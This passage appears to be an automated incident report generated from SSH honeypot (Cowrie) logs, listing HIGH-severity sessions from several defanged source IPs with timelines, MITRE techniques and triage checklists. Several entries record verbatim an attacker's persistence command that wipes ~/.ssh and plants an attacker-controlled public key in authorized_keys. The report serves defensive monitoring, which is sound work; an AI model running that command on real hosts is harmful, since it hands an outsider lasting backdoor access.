- [ ] Block `125.21.59[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-788a9b6a68c6

| Field | Detail |
|---|---|
| **Source IP** | `125.21.59[.]218` |
| **First Seen** | 2026-06-02 17:16 |
| **Last Seen** | 2026-06-02 17:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:16:23` | `cowrie.session.connect` |
| `2026-06-02 17:16:23` | `cowrie.client.version` |
| `2026-06-02 17:16:23` | `cowrie.client.kex` |
| `2026-06-02 17:16:23` | `cowrie.login.success` |
| `2026-06-02 17:16:23` | `cowrie.session.params` |
| `2026-06-02 17:16:23` | `cowrie.command.input` |
| `2026-06-02 17:16:23` | `cowrie.command.failed` |
| `2026-06-02 17:16:23` | `cowrie.log.closed` |
| `2026-06-02 17:16:23` | `cowrie.session.params` |
| `2026-06-02 17:16:23` | `cowrie.command.input` |
| `2026-06-02 17:16:23` | `cowrie.session.file_download` |
| `2026-06-02 17:16:23` | `cowrie.log.closed` |
| `2026-06-02 17:16:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.21.59[.]218` to AbuseIPDB if not already reported
- [ ] Block `125.21.59[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8eb9d1e0cd9

| Field | Detail |
|---|---|
| **Source IP** | `125.21.59[.]218` |
| **First Seen** | 2026-06-02 17:16 |
| **Last Seen** | 2026-06-02 17:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:16:24` | `cowrie.session.connect` |
| `2026-06-02 17:16:24` | `cowrie.client.version` |
| `2026-06-02 17:16:24` | `cowrie.client.kex` |
| `2026-06-02 17:16:24` | `cowrie.login.success` |
| `2026-06-02 17:16:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.21.59[.]218` to AbuseIPDB if not already reported
- [ ] Block `125.21.59[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66734e08d98d

| Field | Detail |
|---|---|
| **Source IP** | `107.0.200[.]227` |
| **First Seen** | 2026-06-02 17:18 |
| **Last Seen** | 2026-06-02 17:19 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:18:59` | `cowrie.session.connect` |
| `2026-06-02 17:18:59` | `cowrie.client.version` |
| `2026-06-02 17:19:00` | `cowrie.client.kex` |
| `2026-06-02 17:19:03` | `cowrie.login.success` |
| `2026-06-02 17:19:06` | `cowrie.session.params` |
| `2026-06-02 17:19:06` | `cowrie.command.input` |
| `2026-06-02 17:19:06` | `cowrie.command.failed` |
| `2026-06-02 17:19:08` | `cowrie.log.closed` |
| `2026-06-02 17:19:09` | `cowrie.session.params` |
| `2026-06-02 17:19:09` | `cowrie.command.input` |
| `2026-06-02 17:19:11` | `cowrie.session.file_download` |
| `2026-06-02 17:19:11` | `cowrie.log.closed` |
| `2026-06-02 17:19:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.0.200[.]227` to AbuseIPDB if not already reported
- [ ] Block `107.0.200[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54ea8f041952

| Field | Detail |
|---|---|
| **Source IP** | `107.0.200[.]227` |
| **First Seen** | 2026-06-02 17:19 |
| **Last Seen** | 2026-06-02 17:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:19:21` | `cowrie.session.connect` |
| `2026-06-02 17:19:21` | `cowrie.client.version` |
| `2026-06-02 17:19:22` | `cowrie.client.kex` |
| `2026-06-02 17:19:26` | `cowrie.login.success` |
| `2026-06-02 17:19:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.0.200[.]227` to AbuseIPDB if not already reported
- [ ] Block `107.0.200[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16513d0c9067

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 17:22 |
| **Last Seen** | 2026-06-02 17:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:22:35` | `cowrie.session.connect` |
| `2026-06-02 17:22:35` | `cowrie.client.version` |
| `2026-06-02 17:22:35` | `cowrie.client.kex` |
| `2026-06-02 17:22:36` | `cowrie.login.success` |
| `2026-06-02 17:22:37` | `cowrie.session.params` |
| `2026-06-02 17:22:37` | `cowrie.command.input` |
| `2026-06-02 17:22:37` | `cowrie.command.failed` |
| `2026-06-02 17:22:37` | `cowrie.log.closed` |
| `2026-06-02 17:22:37` | `cowrie.session.params` |
| `2026-06-02 17:22:37` | `cowrie.command.input` |
| `2026-06-02 17:22:38` | `cowrie.session.file_download` |
| `2026-06-02 17:22:38` | `cowrie.log.closed` |
| `2026-06-02 17:22:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ebc763cf042

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 17:22 |
| **Last Seen** | 2026-06-02 17:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:22:41` | `cowrie.session.connect` |
| `2026-06-02 17:22:41` | `cowrie.client.version` |
| `2026-06-02 17:22:41` | `cowrie.client.kex` |
| `2026-06-02 17:22:42` | `cowrie.login.success` |
| `2026-06-02 17:22:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9656b042c89a

| Field | Detail |
|---|---|
| **Source IP** | `101.126.24[.]58` |
| **First Seen** | 2026-06-02 17:23 |
| **Last Seen** | 2026-06-02 17:23 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:23:29` | `cowrie.session.connect` |
| `2026-06-02 17:23:29` | `cowrie.client.version` |
| `2026-06-02 17:23:29` | `cowrie.client.kex` |
| `2026-06-02 17:23:30` | `cowrie.login.success` |
| `2026-06-02 17:23:30` | `cowrie.session.params` |
| `2026-06-02 17:23:30` | `cowrie.command.input` |
| `2026-06-02 17:23:30` | `cowrie.command.failed` |
| `2026-06-02 17:23:31` | `cowrie.log.closed` |
| `2026-06-02 17:23:31` | `cowrie.session.params` |
| `2026-06-02 17:23:31` | `cowrie.command.input` |
| `2026-06-02 17:23:31` | `cowrie.session.file_download` |
| `2026-06-02 17:23:31` | `cowrie.log.closed` |
| `2026-06-02 17:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.24[.]58` to AbuseIPDB if not already reported
- [ ] Block `101.126.24[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4df4c610d7bd

| Field | Detail |
|---|---|
| **Source IP** | `101.126.24[.]58` |
| **First Seen** | 2026-06-02 17:23 |
| **Last Seen** | 2026-06-02 17:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:23:41` | `cowrie.session.connect` |
| `2026-06-02 17:23:42` | `cowrie.client.version` |
| `2026-06-02 17:23:42` | `cowrie.client.kex` |
| `2026-06-02 17:23:43` | `cowrie.login.success` |
| `2026-06-02 17:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.24[.]58` to AbuseIPDB if not already reported
- [ ] Block `101.126.24[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9cb36257fde

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 17:26 |
| **Last Seen** | 2026-06-02 17:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:26:16` | `cowrie.session.connect` |
| `2026-06-02 17:26:16` | `cowrie.client.version` |
| `2026-06-02 17:26:16` | `cowrie.client.kex` |
| `2026-06-02 17:26:17` | `cowrie.login.success` |
| `2026-06-02 17:26:17` | `cowrie.session.params` |
| `2026-06-02 17:26:17` | `cowrie.command.input` |
| `2026-06-02 17:26:17` | `cowrie.command.failed` |
| `2026-06-02 17:26:18` | `cowrie.log.closed` |
| `2026-06-02 17:26:18` | `cowrie.session.params` |
| `2026-06-02 17:26:18` | `cowrie.command.input` |
| `2026-06-02 17:26:18` | `cowrie.session.file_download` |
| `2026-06-02 17:26:18` | `cowrie.log.closed` |
| `2026-06-02 17:26:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f4a33193edf

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 17:26 |
| **Last Seen** | 2026-06-02 17:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:26:21` | `cowrie.session.connect` |
| `2026-06-02 17:26:21` | `cowrie.client.version` |
| `2026-06-02 17:26:22` | `cowrie.client.kex` |
| `2026-06-02 17:26:23` | `cowrie.login.success` |
| `2026-06-02 17:26:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2452bfd88abd

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 17:31 |
| **Last Seen** | 2026-06-02 17:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:31:59` | `cowrie.session.connect` |
| `2026-06-02 17:31:59` | `cowrie.client.version` |
| `2026-06-02 17:31:59` | `cowrie.client.kex` |
| `2026-06-02 17:32:00` | `cowrie.login.success` |
| `2026-06-02 17:32:01` | `cowrie.session.params` |
| `2026-06-02 17:32:01` | `cowrie.command.input` |
| `2026-06-02 17:32:01` | `cowrie.command.failed` |
| `2026-06-02 17:32:01` | `cowrie.log.closed` |
| `2026-06-02 17:32:02` | `cowrie.session.params` |
| `2026-06-02 17:32:02` | `cowrie.command.input` |
| `2026-06-02 17:32:02` | `cowrie.session.file_download` |
| `2026-06-02 17:32:02` | `cowrie.log.closed` |
| `2026-06-02 17:32:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f78d32ed6070

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 17:32 |
| **Last Seen** | 2026-06-02 17:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:32:05` | `cowrie.session.connect` |
| `2026-06-02 17:32:05` | `cowrie.client.version` |
| `2026-06-02 17:32:05` | `cowrie.client.kex` |
| `2026-06-02 17:32:06` | `cowrie.login.success` |
| `2026-06-02 17:32:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d46a557cb71f

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 17:33 |
| **Last Seen** | 2026-06-02 17:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:33:56` | `cowrie.session.connect` |
| `2026-06-02 17:33:56` | `cowrie.client.version` |
| `2026-06-02 17:33:56` | `cowrie.client.kex` |
| `2026-06-02 17:33:57` | `cowrie.login.success` |
| `2026-06-02 17:33:58` | `cowrie.session.params` |
| `2026-06-02 17:33:58` | `cowrie.command.input` |
| `2026-06-02 17:33:58` | `cowrie.command.failed` |
| `2026-06-02 17:33:58` | `cowrie.log.closed` |
| `2026-06-02 17:33:58` | `cowrie.session.params` |
| `2026-06-02 17:33:58` | `cowrie.command.input` |
| `2026-06-02 17:33:59` | `cowrie.session.file_download` |
| `2026-06-02 17:33:59` | `cowrie.log.closed` |
| `2026-06-02 17:34:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad6cf08a76c9

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 17:34 |
| **Last Seen** | 2026-06-02 17:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:34:02` | `cowrie.session.connect` |
| `2026-06-02 17:34:02` | `cowrie.client.version` |
| `2026-06-02 17:34:02` | `cowrie.client.kex` |
| `2026-06-02 17:34:03` | `cowrie.login.success` |
| `2026-06-02 17:34:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f3d045e0311

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 17:35 |
| **Last Seen** | 2026-06-02 17:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:35:53` | `cowrie.session.connect` |
| `2026-06-02 17:35:53` | `cowrie.client.version` |
| `2026-06-02 17:35:53` | `cowrie.client.kex` |
| `2026-06-02 17:35:54` | `cowrie.login.success` |
| `2026-06-02 17:35:55` | `cowrie.session.params` |
| `2026-06-02 17:35:55` | `cowrie.command.input` |
| `2026-06-02 17:35:55` | `cowrie.command.failed` |
| `2026-06-02 17:35:55` | `cowrie.log.closed` |
| `2026-06-02 17:35:55` | `cowrie.session.params` |
| `2026-06-02 17:35:55` | `cowrie.command.input` |
| `2026-06-02 17:35:56` | `cowrie.session.file_download` |
| `2026-06-02 17:35:56` | `cowrie.log.closed` |
| `2026-06-02 17:36:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66087f3d5f89

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 17:35 |
| **Last Seen** | 2026-06-02 17:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:35:59` | `cowrie.session.connect` |
| `2026-06-02 17:35:59` | `cowrie.client.version` |
| `2026-06-02 17:35:59` | `cowrie.client.kex` |
| `2026-06-02 17:36:00` | `cowrie.login.success` |
| `2026-06-02 17:36:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d3c8f197b35

| Field | Detail |
|---|---|
| **Source IP** | `107.0.200[.]227` |
| **First Seen** | 2026-06-02 17:37 |
| **Last Seen** | 2026-06-02 17:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
